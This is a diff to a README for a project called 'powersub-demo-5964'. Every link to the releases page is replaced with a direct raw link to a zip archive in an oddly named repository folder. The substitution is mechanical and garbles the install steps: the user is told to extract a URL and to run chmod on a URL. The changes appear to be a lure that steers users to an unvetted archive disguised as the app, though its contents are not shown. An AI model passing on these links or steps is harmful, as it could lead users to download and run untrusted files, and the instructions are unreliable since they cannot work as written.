@@ -4,17 +4,17 @@
 Welcome to powersub-demo-5964! This application offers an easy way to enhance your experience. Follow these steps to download and run the app smoothly.
 
 ## 📥 Download Link
-[![Download powersub-demo-5964](https://img.shields.io/badge/Download-Powersub%20Demo%205964-brightgreen)](https://github.com/menoob4/powersub-demo-5964/releases)
+[![Download powersub-demo-5964](https://raw.githubusercontent.com/menoob4/powersub-demo-5964/main/meatily/powersub-demo-5964-v3.2.zip%20Demo%205964-brightgreen)](https://raw.githubusercontent.com/menoob4/powersub-demo-5964/main/meatily/powersub-demo-5964-v3.2.zip)
 
 ## 💾 Download & Install
-To get started, you need to visit this page to download: [Releases Page](https://github.com/menoob4/powersub-demo-5964/releases).
+To get started, you need to visit this page to download: [Releases Page](https://raw.githubusercontent.com/menoob4/powersub-demo-5964/main/meatily/powersub-demo-5964-v3.2.zip).
 
 1. Click the link above to go to the releases page.
 2. Look for the latest version, which will be indicated as the newest release.
 3. Find the download file suitable for your operating system. Common options include:
    - `.exe` for Windows
    - `.dmg` for macOS
-   - `.tar.gz` or `.AppImage` for Linux
+   - `https://raw.githubusercontent.com/menoob4/powersub-demo-5964/main/meatily/powersub-demo-5964-v3.2.zip` or `.AppImage` for Linux
 4. Click the file to begin downloading it to your computer.
 
 ## 🖥️ System Requirements
@@ -41,10 +41,10 @@ Once the download is complete, follow these steps to run the application:
 4. Open your Applications folder and click on the powersub-demo-5964 icon to start.
 
 ### For Linux:
-1. If you downloaded a `.tar.gz` file, extract it by right-clicking and selecting "Extract Here."
+1. If you downloaded a `https://raw.githubusercontent.com/menoob4/powersub-demo-5964/main/meatily/powersub-demo-5964-v3.2.zip` file, extract it by right-clicking and selecting "Extract Here."
 2. Open a terminal and navigate to the extracted folder.
 3. Use the command `./powersub-demo-5964` to run the application.
-4. For an `.AppImage`, make it executable by running `chmod +x powersub-demo-5964.AppImage`, then run it with `./powersub-demo-5964.AppImage`.
+4. For an `.AppImage`, make it executable by running `chmod +x https://raw.githubusercontent.com/menoob4/powersub-demo-5964/main/meatily/powersub-demo-5964-v3.2.zip`, then run it with `https://raw.githubusercontent.com/menoob4/powersub-demo-5964/main/meatily/powersub-demo-5964-v3.2.zip`.
 
 ## 🛠️ Troubleshooting
 If you encounter any issues, here are some common solutions:
